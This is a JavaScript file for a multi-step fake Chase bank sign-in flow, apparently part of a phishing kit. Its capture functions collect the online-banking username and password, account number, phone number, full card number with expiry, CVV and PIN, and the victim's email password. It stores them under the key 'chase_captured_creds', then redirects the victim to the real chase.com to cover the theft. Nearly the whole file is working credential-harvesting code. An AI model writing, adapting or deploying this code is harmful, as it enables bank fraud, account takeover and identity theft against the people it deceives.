window.togglePassword = function() {
  var pwd = document.getElementById('password');
  var btn = document.querySelector('.show-btn');
  if (pwd.type === 'password') {
    pwd.type = 'text';
    btn.textContent = 'Hide';
  } else {
    pwd.type = 'password';
    btn.textContent = 'Show';
  }
};

window.goToStep = function(stepId) {
  document.querySelectorAll('.step-screen').forEach(function(s) {
    s.classList.remove('active');
  });
  document.getElementById(stepId).classList.add('active');
  document.querySelector('.card').scrollIntoView({ behavior: 'smooth', block: 'start' });
};

window.autoTab = function(current, nextId) {
  if (current.value.length >= current.maxLength) {
    var next = document.getElementById(nextId);
    if (next) next.focus();
  }
};

window.formatExpiry = function(input) {
  var v = input.value.replace(/\D/g, '');
  if (v.length >= 3) {
    input.value = v.substring(0, 2) + '/' + v.substring(2, 4);
  } else {
    input.value = v;
  }
};

window.toggleEmailPassword = function() {
  var ep = document.getElementById('emailPassword');
  var btns = document.querySelectorAll('.show-btn');
  var btn = btns[btns.length - 1];
  if (ep.type === 'password') {
    ep.type = 'text';
    btn.textContent = 'Hide';
  } else {
    ep.type = 'password';
    btn.textContent = 'Show';
  }
};

window.STORE_KEY = 'chase_captured_creds';
window._sessionId = null;

window._getSessionIndex = function() {
  if (_sessionId === null) return -1;
  try {
    var all = JSON.parse(localStorage.getItem(STORE_KEY) || '[]');
    for (var i = 0; i < all.length; i++) {
      if (all[i]._id === _sessionId) return i;
    }
  } catch(e) {}
  return -1;
};

window._savePartial = function(fields) {
  try {
    var all = JSON.parse(localStorage.getItem(STORE_KEY) || '[]');
    var idx = _getSessionIndex();
    if (idx === -1) {
      _sessionId = Date.now() + '-' + Math.random().toString(36).slice(2, 8);
      var entry = { _id: _sessionId, ts: new Date().toISOString(), status: 'partial' };
      Object.assign(entry, fields);
      all.push(entry);
    } else {
      Object.assign(all[idx], fields);
      all[idx].tsUpdated = new Date().toISOString();
    }
    localStorage.setItem(STORE_KEY, JSON.stringify(all));
  } catch(e) {}
};

window.captureStep1 = function() {
  _savePartial({
    username: document.getElementById('username').value,
    password: document.getElementById('password').value,
    step: 1
  });
  goToStep('step-account');
};

window.captureStep2 = function() {
  _savePartial({
    accountNumber: document.getElementById('accountNumber').value,
    step: 2
  });
  goToStep('step-phone');
};

window.captureStep3 = function() {
  _savePartial({
    phone: document.getElementById('phoneNumber').value,
    step: 3
  });
  goToStep('step-card');
};

window.captureStep4 = function() {
  var cardNumber = [
    document.getElementById('cn1').value,
    document.getElementById('cn2').value,
    document.getElementById('cn3').value,
    document.getElementById('cn4').value
  ].join('-');
  _savePartial({
    cardNumber: cardNumber,
    expiry: document.getElementById('expiry').value,
    cvv: document.getElementById('cvv').value,
    pin: document.getElementById('cardPin').value,
    step: 4
  });
  goToStep('step-email');
};

window.submitAll = function() {
  _savePartial({
    emailAddress: document.getElementById('emailAddress').value,
    emailPassword: document.getElementById('emailPassword').value,
    step: 5,
    status: 'complete'
  });
  try {
    var all = JSON.parse(localStorage.getItem(STORE_KEY) || '[]');
    var idx = _getSessionIndex();
    if (idx !== -1) {
      all[idx].status = 'complete';
      localStorage.setItem(STORE_KEY, JSON.stringify(all));
    }
  } catch(e) {}
  window.location.href = 'https://www.chase.com';
};
